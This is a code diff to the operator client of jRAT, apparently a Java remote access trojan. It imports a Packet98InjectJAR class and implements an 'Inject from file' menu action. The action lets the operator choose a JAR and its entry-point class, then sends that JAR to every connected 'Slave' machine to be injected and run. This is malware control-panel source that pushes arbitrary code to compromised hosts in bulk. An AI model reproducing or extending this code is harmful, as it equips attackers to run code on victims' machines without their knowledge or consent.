@@ -76,6 +76,7 @@ import su.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
 import su.jrat.client.packets.outgoing.Packet38RunCommand;
 import su.jrat.client.packets.outgoing.Packet40Thumbnail;
 import su.jrat.client.packets.outgoing.Packet45Reconnect;
+import su.jrat.client.packets.outgoing.Packet98InjectJAR;
 import su.jrat.client.settings.Settings;
 import su.jrat.client.ui.components.DraggableTabbedPane;
 import su.jrat.client.ui.dialogs.DialogEula;
@@ -1411,6 +1412,29 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
 		mntmInjectFromFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					JFileChooser f = new JFileChooser();
+					f.showOpenDialog(null);
+				
+					File file = f.getSelectedFile();
+
+					if (file == null) {
+						return;
+					}
+					
+					String mainClass;
+					
+					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");
+
+					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
+						return;
+					}
+					
+					for (Slave slave : servers) {
+						slave.addToSendQueue(new Packet98InjectJAR(file, mainClass));
+					}
+				}
 			}
 		});
 		mntmInjectFromFile.setIcon(new ImageIcon(Frame.class.getResource("/icons/drive-upload.png")));
